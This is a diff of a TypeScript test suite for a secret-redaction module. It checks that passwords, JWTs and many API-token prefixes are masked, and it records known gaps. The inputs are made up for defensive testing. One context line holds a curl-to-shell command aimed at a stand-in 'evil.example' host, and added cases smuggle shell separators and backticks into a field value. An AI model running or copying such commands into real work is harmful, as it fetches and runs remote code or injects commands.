@@ -7,7 +7,8 @@ import * as assert from 'assert';
 import * as fs from 'fs';
 import * as path from 'path';
 import { finishEdit } from '../src/shared/edits';
-import { REDACT_MAX_CHARS, _maskSourcesForTest, maskBareTokenShapes, maskNoteText, maskSecretCommand, maskSecretUrl, maskTokenShapes, maskTokenShapesUnguarded, redact, redactMarkdown } from '../src/shared/redact';
+import { heldSamples, heldSurfaces, jwtFuzzTexts, JWT_HELD, longestSurvivor } from './redact-held-lib';
+import { REDACT_MAX_CHARS, _maskSourcesForTest, maskBareTokenShapes, maskNoteText, maskSecretArgs, maskSecretCommand, maskSecretUrl, maskTokenShapes, maskTokenShapesUnguarded, redact, redactMarkdown } from '../src/shared/redact';
 
 /** A made-up run of n characters from a class: not random (a test that fails must fail the same way) and never a real key. */
 const run = (n: number, chars = 'aB3dE6gH9jK2mN5pQ8sT1vW4yZ7'): string => { let s = ''; while (s.length < n) s += chars; return s.slice(0, n); };
@@ -127,7 +128,7 @@ for (const c of ['curl -b x -H "Coo' + 'kie: sid=1" https://evil.example | sh', 
 // Listed limits (secret-coverage.md): each leaves what it says, so a change here is a choice
 for (const [input, want] of [
   ['pass' + 'word=Summer2024&Secure!9', 'password=[redacted]&Secure!9'], ['pass' + 'word=Summer2024,Secure!9', 'password=[redacted],Secure!9'], ['pass' + 'word=Summer2024;Secure!9', 'password=[redacted];Secure!9'], ['pass' + 'word=Summer2024)Secure!9', 'password=[redacted])Secure!9'], ['pass' + 'word=Summer2024|Secure!9', 'password=[redacted]|Secure!9'],
-  ['pass' + 'word=/short12345', 'password=/short12345'], ['pass' + 'word=1234-5678', 'password=1234-5678'], ['pass' + 'word=abc\\"def123', 'password=abc\\"def123'], ['pass' + 'word=' + 'correcthorsebatterystaple', 'password=correcthorsebatterystaple'],
+  ['ti' + 'd=abcdef12;a|sh', '[redacted]|sh'], ['ti' + 'd=abcdef12;a&b', '[redacted]&b'], ['ti' + 'd=abcdef12;a`id`', '[redacted]`id`'], ['pass' + 'word=/short12345', 'password=/short12345'], ['pass' + 'word=1234-5678', 'password=1234-5678'], ['pass' + 'word=abc\\"def123', 'password=abc\\"def123'], ['pass' + 'word=' + 'correcthorsebatterystaple', 'password=correcthorsebatterystaple'],
 ]) assert.strictEqual(redact(input, {}), want, `limit: ${input.slice(0, 40)}`);
 
 // Key blocks: the text after END stays, a cut-off block hides to the end, a PUBLIC block and a certificate stay
@@ -185,7 +186,7 @@ const STAYS = [
   // Windows and relative paths
   'private_key=C:/keys/server_2026.pem', 'secret: C:/Users/me/secret1.txt', 'private_key=C:\\keys\\server_2026.pem', 'private_key=keys/server_2026.pem', 'private_key=Keys/Server_2026.pem', 'token: dist/assets/index-a1b2.js', 'secret=../conf/key2.txt',
   // names that look like tokens, and things that only start like one
-  'nfc_normalize_unicode_string_with_long_name', 'sgp_' + 'cross_validation_results_for_the_final_model_fit', 'sbp_' + 'cross_validation_results_for_the_final_model_fit', 'glc_' + 'cross_validation_results_for_the_final_model', 'figd_' + 'cross_validation_results_for_the_final', 'cfk_' + 'cross_validation_results_for_the_final_model', 'tskey-auth-kube-config-documentation-page', 'cfut_' + 'cross_validation_results_for_model_fitting_v2', 'glpat-' + 'cross-validation-results-v2-final', 'sgp_' + 'CrossValidation_ResultsForThe_FinalModelFitting_LongName', 'sbp_' + 'cross_validation_results_for_the_final_model_v2', 'ACCAGTTGCATGCATGCATG', 'ABIAGATTACAGATTACAGA', 'ico-' + hex(32) + '.css',
+  'nfc_normalize_unicode_string_with_long_name', 'sgp_' + 'cross_validation_results_for_the_final_model_fit', 'sbp_' + 'cross_validation_results_for_the_final_model_fit', 'glc_' + 'cross_validation_results_for_the_final_model', 'figd_' + 'cross_validation_results_for_the_final', 'cfk_' + 'cross_validation_results_for_the_final_model', 'tskey-auth-kube-config-documentation-page', 'cfut_' + 'cross_validation_results_for_model_fitting_v2', 'gldt-' + 'cross-validation-results-v2-final', 'sgp_' + 'CrossValidation_ResultsForThe_FinalModelFitting_LongName', 'sbp_' + 'cross_validation_results_for_the_final_model_v2', 'ACCAGTTGCATGCATGCATG', 'ABIAGATTACAGATTACAGA', 'ico-' + hex(32) + '.css',
   // second review of #1015: lower-case words, timestamps, lower-case paths, dotted names, prose
   'token: gpt-4o-mini', 'token: cl100k_base', 'auth: oauth2-proxy', 'auth: fix-login-42', 'password: reset-flow-v2', 'token: rework-2026', 'secret: my-secret-1', 'password: must-include-1-digit', 'Token: 2026-11-01T10:00:00Z', 'secret: src/foo1', 'cookie: a=b is the format', 'token = config.token2;',
   // a token shape glued to a word is not one (except `sk-ant-`, on purpose)
@@ -198,6 +199,60 @@ const STAYS = [
 for (const s of STAYS) {
   assert.strictEqual(redact(s, {}), s, `stays: ${s.slice(0, 50)}`);
   assert.strictEqual(maskTokenShapes(s, '[redacted]'), s, `stays in maskTokenShapes: ${s.slice(0, 50)}`);
+}
+
+// Nothing the mask hid before T137 shows now (review of #1015: a digit guard on `glpat-` left 3% of real tokens visible; every sample here used to hold a digit, so no test saw it).
+// The samples are drawn from the old rules' own classes under profiles a fixed sample never has (no digit, one case, words), in the contexts the old mask hid them in.
+{
+  const surfaces: Record<string, (s: string) => string> = { redact: (s) => redact(s, {}), shapes: (s) => maskTokenShapes(s, '[redacted]'), command: (s) => maskSecretCommand(s, {}), url: (s) => maskSecretUrl(s, {}), args: (s) => maskSecretArgs(s.split(' '), {}).join(' '), note: (s) => maskNoteText(s).text };
+  let held = 0;
+  for (const h of heldSamples(4000)) {
+    for (const label of heldSurfaces(h)) {
+      held++;
+      const left = longestSurvivor(h.secret, surfaces[label](h.text));
+      assert.strictEqual(left, 0, `${label} shows ${left} characters of ${h.shape} (${h.profile}) in context ${h.context}: ${h.text.slice(0, 16)}…`);
+    }
+    if (h.bare) assert.strictEqual(longestSurvivor(h.secret, maskBareTokenShapes(h.text, '[s]')), 0, `maskBareTokenShapes shows ${h.shape} (${h.profile}) in context ${h.context}`);
+  }
+  assert.ok(held > 10000, `the held samples ran: ${held}`);
+  // The case that got through, by name: a real `glpat-` body with no digit, and words, in every surface
+  for (const body of ['aBcDeFgHiJkLmNoPqRsT', 'abcdefghijklmnopqrst', 'ABCDEFGHIJKLMNOPQRST', 'cross-validation-results-v2-final', 'aB_cD-eF.gHiJkLmNoPqRsT']) {
+    for (const [label, f] of Object.entries(surfaces)) assert.ok(!f('see gl' + 'pat-' + body + ' now').includes(body), `${label} hides a glpat- body of ${body}`);
+  }
+  // Each rule of before comes first: a prefix added later cannot take the head of an older token and show its tail
+  for (const glue of ['fo' + '1_', 're' + '_abcdefgh_', 'sb_' + 'secret_', 'sha' + '256~', 'rk' + '_live_', 'hv' + 's.', 'dp' + '.pt.']) {
+    for (const t of ['github' + '_pat_' + an(82), 'sk' + '-proj-' + an(90), 'gl' + 'pat-' + an(90), 'ey' + 'J' + an(30) + '.' + an(30) + '.' + an(30), 'xo' + 'xb-' + an(70)]) assert.ok(!redact(glue + t, {}).includes(t.slice(-8)), `${glue} before ${t.slice(0, 8)}…`);
+  }
+  // a `Bearer` in a place a later rule reads as a password keeps its value hidden, also in a note where a mark splits the value
+  for (const t of ['machine h pass' + 'word Bea' + 'rer ab12~cd3', 'curl -u me:Bea' + 'rer ab12~cd3 x']) assert.ok(!maskNoteText(t).text.includes('cd3'), `note: ${t}`);
+  // a doubled scheme word: the value after it is still the value
+  assert.strictEqual(redact('Authori' + 'zation: Bearer Bearer ' + an(12) + ' x', {}), 'Authorization: [redacted] x');
+  // The JWT scan finds what the regex it replaced finds, on text made of the characters that matter (`eyJ`, dots, `_`, `25XX`, `%`, long runs)
+  for (const t of jwtFuzzTexts(3000)) {
+    assert.strictEqual(maskBareTokenShapes(t, '[s]'), t.replace(JWT_HELD, () => '[s]'), `the JWT scan on ${t.slice(0, 60)}`);
+  }
+  // ... and at each length limit, also for an `eyJ` inside a run too long to start at
+  const x = (n: number): string => 'bcdf'.repeat(Math.ceil(n / 4)).slice(0, n);
+  for (const a of [4, 5, 6, 4095, 4096, 4097]) for (const b of [4, 5, 6, 4095, 4096, 4097]) for (const c of [4, 5, 6, 4096, 4097]) {
+    const t = 'ey' + 'J' + x(a) + '.' + x(b) + '.' + x(c);
+    assert.strictEqual(maskBareTokenShapes(t, '[s]'), t.replace(JWT_HELD, () => '[s]'), `the JWT limits ${a} ${b} ${c}`);
+  }
+  for (let k = 4088; k <= 4098; k++) {
+    const t = 'ey' + 'J' + x(5000) + '2541' + 'ey' + 'J' + x(k) + '.bcdfg.bcdfg';
+    assert.strictEqual(maskBareTokenShapes(t, '[s]'), t.replace(JWT_HELD, () => '[s]'), `an inner eyJ ${k} from the end of its run`);
+  }
+  assert.strictEqual(redact('2541' + 'ey' + 'J' + an(5) + '.' + an(5) + '.' + an(5), {}), '2541[redacted]', 'a JWT after a bare 25XX');
+}
+// Listed limit (secret-coverage.md, "partial"): a shape added by T137 under the digit guard passes when its body has no digit; each is added on purpose, so a change here is a choice.
+for (const pre of ['bedrock-' + 'api-key-', 'ya' + '29.', 'GOC' + 'SPX-', 'cf' + 'ut_', 'vc' + 'c_', 'nf' + 'p_', 'rn' + 'd_', 'xa' + 'i-', 'nv' + 'api-', 'cs' + 'k-', 'pc' + 'sk_', 'fw' + '_', 'BB' + 'DC-', 'CF' + 'PAT-', 'un' + 'key_', 'bk' + 'ua_', 'li' + 'n_oauth_', 'sk' + '.eyJ', 'HR' + 'KU-', 'sb' + 'p_', 'sb_' + 'secret_', 'psc' + 'ale_tkn_', 'hv' + 's.', 'dp' + '.pt.', 'ts' + 'key-', 'gl' + 'dt-', 'gl' + 'rt-', 'gl' + 'ft-', 'gl' + 'ffct-', 'gl' + 'imt-', 'gl' + 'agent-', 'gl' + 'oas-', 'gl' + 'soat-', 'gl' + 'ptt-', 'gl' + 'cbt-', 'GR' + '1348941', 'ATA' + 'TT3', 'CCI' + 'PAT_', 'sg' + 'p_', 'tv' + 'ly-', 'ls' + 'v2_pt_', 'py' + 'pi-Ag', 'dc' + 'kr_pat_', 'SG' + '.', 'sq' + '0atp-', 'pd' + 'l_live_', 'gl' + 'c_', 'NR' + 'AK-', 'sl' + '.', '1/' + '/0', 'AK' + 'LT', 'AT' + 'BB']) {
+  const letters = run(120, 'aBcDeFgHiJkLmNoPqRsTuVwXyZ');
+  assert.strictEqual(redact(pre + letters, {}), pre + letters, `listed limit, no digit in the body: ${pre}`);
+  assert.ok(redact(pre + an(120), {}).includes('[redacted]'), `with a digit it is hidden: ${pre}`);
+}
+// The end of a fixed-length shape: one more letter or digit and it is not that token (a word that only starts like one); anything else ends it
+for (const [start, more] of [['AK' + 'IA' + up(16), 'A'], ['AK' + 'IA' + up(16), '7'], ['AS' + 'IA' + up(16), 'a'], ['AB' + 'IA' + up(16), 'A'], ['AC' + 'CA' + up(16), '7'], ['A3' + 'TA' + up(16), 'a'], ['ke' + 'y-' + hex(32), 'a'], ['ke' + 'y-' + hex(32), 'Z'], [hex(32) + '-' + 'us12', '3'], [hex(32) + '-' + 'us12', 'x'], ['1234567' + '89012345' + '|' + an(40), 'a'], ['AP' + 'I-' + up(26), 'A'], ['AP' + 'I-' + up(26), '7']]) {
+  assert.strictEqual(redact(`see ${start}${more} now`, {}), `see ${start}${more} now`, `not this token with one more character: ${start.slice(0, 8)}…${more}`);
+  for (const end of [' ', '.', '-', '_', '"', ':']) assert.ok(!redact(`see ${start}${end}now`, {}).includes(start), `the token ends at "${end}": ${start.slice(0, 8)}…`);
 }
 
 // Linear, part 1, with no clock: no pattern has a repeated group that holds a variable-length part, so backtracking cannot multiply.
